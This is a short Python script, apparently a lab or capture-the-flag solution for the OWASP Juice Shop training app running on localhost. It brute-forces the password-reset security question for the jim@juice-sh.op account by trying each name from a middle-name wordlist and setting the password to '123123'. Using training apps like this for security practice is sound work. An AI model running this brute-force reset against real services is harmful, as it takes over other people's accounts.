import requests
import json
import time

#API details
url = "http://localhost:3000/rest/user/reset-password"

headers = {'Content-Type': 'application/json'}
cookies = {
            "language" : "en",
            "welcomebanner_status":"dismiss",
            "cookieconsent_status":"dismiss",  
            "continueCode" :"RrhQt4IvsqS8UYH9uvhMTjF9fvSptWiqfvS56ugghPDcagf7vSkEUYguEmhr2tEgcNYI2vU1eHvaFkpfoJUPRtRbcvyTmeCXrsy5FEQfgRSnv"
            }
#Making http post request

wordlist_path = "/home/waza/Downloads/middle-names.txt"
with open(wordlist_path) as f:
    count = 0
    for name in f.readlines():
        count = count +1
        name = name.strip()
        print("[TRYING {}] {}".format(count, name), end="")
        body = json.dumps({"email":"jim@juice-sh.op","answer":"{}".format(name),"new":"123123","repeat":"123123"})
        response = requests.post(url, headers=headers, cookies=cookies, data=body, verify=False)
        time.sleep(.5)
        
        if(response.status_code == 200):
            print("\tMATCH")
            exit(0)
        else:
            print("\tNO MATCH")